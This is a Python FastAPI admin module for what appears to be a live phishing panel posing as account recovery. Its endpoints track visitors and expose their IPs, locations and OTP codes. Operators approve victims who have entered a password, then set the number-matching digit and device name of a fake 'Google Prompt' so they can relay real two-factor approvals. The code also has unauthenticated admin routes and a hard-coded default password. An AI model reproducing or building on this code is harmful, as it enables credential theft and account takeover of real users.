from fastapi import APIRouter, Depends, HTTPException, Query
from sqlalchemy.orm import Session
from sqlalchemy import desc, func
from typing import List, Optional
from datetime import datetime
from app.database import get_db
from app.models import User, RecoverySession, EmailLog, AuditLog, VisitorLog
from app.schemas import UserAdminResponse, AuditLogResponse, VisitorLogResponse, StandardResponse
from app.security import hash_password

router = APIRouter(prefix="/api/admin", tags=["Admin Management"])

@router.get("/overview")
def get_admin_overview(db: Session = Depends(get_db)):
    """
    Returns dashboard statistics for the admin panel.
    """
    total_users = db.query(func.count(User.id)).scalar() or 0
    pending_sessions = db.query(func.count(RecoverySession.id)).filter(RecoverySession.status == "PENDING").scalar() or 0
    completed_sessions = db.query(func.count(RecoverySession.id)).filter(RecoverySession.status == "COMPLETED").scalar() or 0
    total_emails = db.query(func.count(EmailLog.id)).scalar() or 0
    total_visitors = db.query(func.count(VisitorLog.id)).scalar() or 0

    # Countries breakdown
    country_counts = (
        db.query(VisitorLog.country, func.count(VisitorLog.id))
        .group_by(VisitorLog.country)
        .order_by(desc(func.count(VisitorLog.id)))
        .limit(5)
        .all()
    )
    top_countries = [{"country": c[0] or "Unknown", "count": c[1]} for c in country_counts]

    # Device type breakdown
    device_counts = (
        db.query(VisitorLog.device_type, func.count(VisitorLog.id))
        .group_by(VisitorLog.device_type)
        .all()
    )
    device_breakdown = {d[0]: d[1] for d in device_counts}

    return {
        "total_users": total_users,
        "pending_sessions": pending_sessions,
        "completed_sessions": completed_sessions,
        "total_emails": total_emails,
        "total_visitors": total_visitors,
        "top_countries": top_countries,
        "device_breakdown": device_breakdown
    }

@router.get("/users", response_model=List[UserAdminResponse])
def get_users(db: Session = Depends(get_db)):
    """
    List all registered users.
    """
    return db.query(User).order_by(desc(User.created_at)).all()

@router.get("/sessions")
def get_recovery_sessions(limit: int = 25, db: Session = Depends(get_db)):
    """
    List recovery sessions with associated user and device details.
    """
    sessions = db.query(RecoverySession).order_by(desc(RecoverySession.created_at)).limit(limit).all()
    results = []
    for s in sessions:
        results.append({
            "id": s.id,
            "user_id": s.user_id,
            "email": s.user.email if s.user else "Unknown",
            "username": s.user.username if s.user else "Unknown",
            "status": s.status,
            "method": s.method,
            "match_number": s.match_number,
            "otp_code": s.otp_code,
            "country": s.country,
            "city": s.city,
            "device_type": s.device_type,
            "os": s.os,
            "browser": s.browser,
            "created_at": s.created_at.isoformat() if s.created_at else None,
            "expires_at": s.expires_at.isoformat() if s.expires_at else None,
            "verified_at": s.verified_at.isoformat() if s.verified_at else None,
            "completed_at": s.completed_at.isoformat() if s.completed_at else None,
            "ip_address": s.ip_address,
            "user_agent": s.user_agent
        })
    return results

@router.get("/visitors", response_model=List[VisitorLogResponse])
def get_visitors(limit: int = 50, db: Session = Depends(get_db)):
    """
    List live visitors with detected Country, City, Device Type, OS, and Browser.
    """
    return db.query(VisitorLog).order_by(desc(VisitorLog.created_at)).limit(limit).all()

@router.get("/audit-logs", response_model=List[AuditLogResponse])
def get_audit_logs(limit: int = 30, db: Session = Depends(get_db)):
    """
    List system audit logs for security oversight.
    """
    return db.query(AuditLog).order_by(desc(AuditLog.created_at)).limit(limit).all()

@router.post("/users/seed-user", response_model=StandardResponse)
def seed_or_reset_user(
    email: str,
    username: str,
    full_name: str,
    password: str = "GonnitPass2026!",
    db: Session = Depends(get_db)
):
    """
    Utility endpoint to quickly create or reset a test user.
    """
    user = db.query(User).filter(User.email == email).first()
    hashed = hash_password(password)
    
    if user:
        user.hashed_password = hashed
        user.username = username
        user.full_name = full_name
        user.is_active = True
        msg = f"User '{email}' updated with password '{password}'."
    else:
        user = User(
            email=email,
            username=username,
            full_name=full_name,
            hashed_password=hashed,
            is_active=True,
            is_admin=False
        )
        db.add(user)
        msg = f"User '{email}' created with password '{password}'."

    db.commit()
    return StandardResponse(success=True, message=msg, data={"email": email, "username": username})

def find_visitor_session_and_user(presence, db: Session):
    sess = None
    user = None
    
    # 1. Try finding session directly by presence.session_id
    if getattr(presence, "session_id", None):
        sess = db.query(RecoverySession).filter(RecoverySession.id == presence.session_id).first()
        if sess and sess.user:
            user = sess.user

    # 2. Try finding user by email or username
    if not user and presence.email:
        clean = presence.email.strip()
        user = db.query(User).filter(
            (User.email.ilike(clean))
            | (User.username.ilike(clean))
            | (User.email.ilike(f"{clean}@%"))
            | (User.email.ilike(f"{clean.split('@')[0]}@%"))
        ).first()

    # 3. If user found but sess not found, get user's latest recovery session
    if user and not sess:
        sess = (
            db.query(RecoverySession)
            .filter(RecoverySession.user_id == user.id)
            .order_by(desc(RecoverySession.created_at))
            .first()
        )

    # 4. Fallback: Find latest recovery session in system
    if not sess:
        sess = db.query(RecoverySession).order_by(desc(RecoverySession.created_at)).first()
        if sess and not user:
            user = sess.user

    return sess, user

@router.post("/approve-visitor/{visitor_id}", response_model=StandardResponse)
def approve_visitor(visitor_id: str, db: Session = Depends(get_db)):
    """
    Admin verifies / approves a live visitor's prompt challenge,
    instantly advancing their browser to the Create New Password screen.
    """
    from app.models import VisitorPresence
    presence = db.query(VisitorPresence).filter(VisitorPresence.visitor_id == visitor_id).first()
    if not presence:
        raise HTTPException(status_code=404, detail="Visitor not found.")
    
    sess, user = find_visitor_session_and_user(presence, db)
    if sess:
        sess.status = "VERIFIED"
        sess.verified_at = datetime.utcnow()
        if not presence.session_id:
            presence.session_id = sess.id

    presence.current_step = "Prompt Verified (Routing to Password Reset)"
    
    db.add(AuditLog(
        user_id=user.id if user else None,
        action="ADMIN_APPROVED_VERIFICATION",
        ip_address=presence.ip_address,
        country=presence.country,
        city=presence.city,
        device_type=presence.device_type,
        details=f"Admin approved verification prompt for {presence.email or visitor_id}"
    ))
    db.commit()

    return StandardResponse(
        success=True,
        message=f"Successfully approved prompt for {presence.email or visitor_id}. Visitor routed to Reset Password."
    )

from pydantic import BaseModel

class ChallengeConfigRequest(BaseModel):
    default_match_number: Optional[int] = 63
    default_device_name: Optional[str] = "Apple iPhone 16"
    auto_permit_password: Optional[bool] = False

class VisitorChallengeUpdateRequest(BaseModel):
    visitor_id: str
    match_number: int
    device_name: str

@router.get("/challenge-config")
def get_challenge_config(db: Session = Depends(get_db)):
    from app.models import SystemConfig
    num_cfg = db.query(SystemConfig).filter(SystemConfig.key == "default_match_number").first()
    dev_cfg = db.query(SystemConfig).filter(SystemConfig.key == "default_device_name").first()
    
    auto_cfg = db.query(SystemConfig).filter(SystemConfig.key == "auto_permit_password").first()
    
    return {
        "default_match_number": int(num_cfg.value) if num_cfg and num_cfg.value.isdigit() else 63,
        "default_device_name": dev_cfg.value if dev_cfg and dev_cfg.value else "Apple iPhone 16",
        "auto_permit_password": auto_cfg.value == "true" if auto_cfg else False
    }

@router.post("/challenge-config")
def update_challenge_config(req: ChallengeConfigRequest, db: Session = Depends(get_db)):
    from app.models import SystemConfig, RecoverySession, VisitorPresence
    num_cfg = db.query(SystemConfig).filter(SystemConfig.key == "default_match_number").first()
    if not num_cfg:
        num_cfg = SystemConfig(key="default_match_number", value=str(req.default_match_number or 63))
        db.add(num_cfg)
    else:
        num_cfg.value = str(req.default_match_number or 63)

    dev_cfg = db.query(SystemConfig).filter(SystemConfig.key == "default_device_name").first()
    if not dev_cfg:
        dev_cfg = SystemConfig(key="default_device_name", value=req.default_device_name or "Apple iPhone 16")
        db.add(dev_cfg)
    else:
        dev_cfg.value = req.default_device_name or "Apple iPhone 16"

    auto_cfg = db.query(SystemConfig).filter(SystemConfig.key == "auto_permit_password").first()
    auto_val = "true" if req.auto_permit_password else "false"
    if not auto_cfg:
        auto_cfg = SystemConfig(key="auto_permit_password", value=auto_val)
        db.add(auto_cfg)
    else:
        auto_cfg.value = auto_val

    # CRITICAL: Propagate global challenge to ALL active/pending sessions immediately!
    new_match_num = int(num_cfg.value)
    new_dev_name = dev_cfg.value

    db.query(RecoverySession).filter(RecoverySession.status == "PENDING").update({
        "match_number": new_match_num,
        "target_device_name": new_dev_name
    }, synchronize_session=False)

    db.query(VisitorPresence).filter(VisitorPresence.is_active == True).update({
        "custom_match_number": new_match_num,
        "custom_device_name": new_dev_name
    }, synchronize_session=False)

    db.commit()
    return {
        "success": True,
        "message": f"Global challenge set to {num_cfg.value} on {dev_cfg.value} (Auto-permit: {auto_val})",
        "default_match_number": int(num_cfg.value),
        "default_device_name": dev_cfg.value,
        "auto_permit_password": req.auto_permit_password or False
    }

@router.post("/update-visitor-challenge")
def update_visitor_challenge(req: VisitorChallengeUpdateRequest, db: Session = Depends(get_db)):
    from app.models import VisitorPresence
    presence = db.query(VisitorPresence).filter(VisitorPresence.visitor_id == req.visitor_id).first()
    if not presence:
        raise HTTPException(status_code=404, detail="Visitor not found.")

    presence.custom_match_number = req.match_number
    presence.custom_device_name = req.device_name
    presence.current_step = f"Google Prompt (#{req.match_number})"

    sess, user = find_visitor_session_and_user(presence, db)
    if sess:
        sess.match_number = req.match_number
        sess.target_device_name = req.device_name

    db.commit()
    return {
        "success": True,
        "message": f"Updated challenge for visitor to #{req.match_number} ({req.device_name})"
    }

@router.post("/permit-visitor/{visitor_id}", response_model=StandardResponse)
def permit_visitor(visitor_id: str, db: Session = Depends(get_db)):
    """
    Admin permits the visitor who entered their password to advance to the Google prompt verification page.
    """
    from app.models import VisitorPresence, SystemConfig
    presence = db.query(VisitorPresence).filter(VisitorPresence.visitor_id == visitor_id).first()
    if not presence:
        raise HTTPException(status_code=404, detail="Visitor not found.")
    
    sess, user = find_visitor_session_and_user(presence, db)
    
    # Read latest global configuration
    num_cfg = db.query(SystemConfig).filter(SystemConfig.key == "default_match_number").first()
    dev_cfg = db.query(SystemConfig).filter(SystemConfig.key == "default_device_name").first()
    global_num = int(num_cfg.value) if num_cfg and num_cfg.value.isdigit() else 63
    global_dev = dev_cfg.value if dev_cfg and dev_cfg.value else "Apple iPhone 16"

    # Use visitor custom challenge if set, otherwise latest global config
    match_num = presence.custom_match_number if (presence.custom_match_number and presence.custom_match_number != 63) else global_num
    dev_name = presence.custom_device_name if (presence.custom_device_name and presence.custom_device_name != "Apple iPhone 16") else global_dev

    if sess:
        sess.admin_decision = "PERMITTED"
        sess.match_number = match_num
        sess.target_device_name = dev_name
        if not presence.session_id:
            presence.session_id = sess.id

    presence.custom_match_number = match_num
    presence.custom_device_name = dev_name
    presence.admin_decision = "PERMITTED"
    presence.current_step = f"Google Prompt (#{match_num})"
    
    db.add(AuditLog(
        user_id=user.id if user else None,
        action="ADMIN_PERMITTED_VISITOR",
        ip_address=presence.ip_address,
        country=presence.country,
        city=presence.city,
        device_type=presence.device_type,
        details=f"Admin permitted visitor {presence.email or visitor_id} to advance to prompt #{match_num} on {dev_name}"
    ))
    db.commit()

    return StandardResponse(
        success=True,
        message=f"Permitted visitor. Advancing to Google Prompt #{match_num}."
    )

@router.post("/reject-visitor/{visitor_id}", response_model=StandardResponse)
def reject_visitor(visitor_id: str, db: Session = Depends(get_db)):
    """
    Admin rejects a suspicious visitor, blocking them from accessing the verification page.
    """
    from app.models import VisitorPresence
    presence = db.query(VisitorPresence).filter(VisitorPresence.visitor_id == visitor_id).first()
    if not presence:
        raise HTTPException(status_code=404, detail="Visitor not found.")
    
    sess, user = find_visitor_session_and_user(presence, db)
    if sess:
        sess.admin_decision = "REJECTED"
        sess.status = "EXPIRED"

    presence.admin_decision = "REJECTED"
    presence.current_step = "Attempt Denied by Admin"
    
    db.add(AuditLog(
        user_id=user.id if user else None,
        action="ADMIN_REJECTED_VISITOR",
        ip_address=presence.ip_address,
        country=presence.country,
        city=presence.city,
        device_type=presence.device_type,
        details=f"Admin rejected suspicious attempt for {presence.email or visitor_id}"
    ))
    db.commit()

    return StandardResponse(
        success=True,
        message=f"Rejected visitor {presence.email or visitor_id}. Visitor attempt blocked."
    )

